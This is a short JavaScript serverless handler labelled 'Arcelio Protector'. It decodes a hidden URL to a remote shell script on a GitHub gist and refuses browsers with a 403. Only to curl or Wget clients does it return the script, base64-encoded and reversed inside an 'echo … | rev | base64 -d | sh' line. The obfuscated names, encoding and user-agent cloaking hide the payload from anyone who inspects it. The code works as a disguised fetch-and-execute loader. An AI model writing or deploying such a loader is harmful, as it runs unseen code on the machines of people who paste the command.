// Arcelio Protector - Vercel Final Deployment
export default async function handler(a, b) {
    const _0x1 = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
    const _0x2 = atob(_0x1);
    
    try {
        const _0x3 = a.headers['user-agent'] || "";
        if (!_0x3.includes("curl") && !_0x3.includes("Wget")) return b.status(403).send("403 Forbidden");

        const _0x4 = await fetch(_0x2);
        const _0x5 = await _0x4.text();
        const _0x6 = Buffer.from(_0x5).toString('base64').split('').reverse().join('');
        
        b.setHeader("Content-Type", "text/plain");
        return b.status(200).send(`echo "${_0x6}" | rev | base64 -d | sh`);
    } catch (_0x7) {
        return b.status(500).send("echo 'Err'");
    }
}
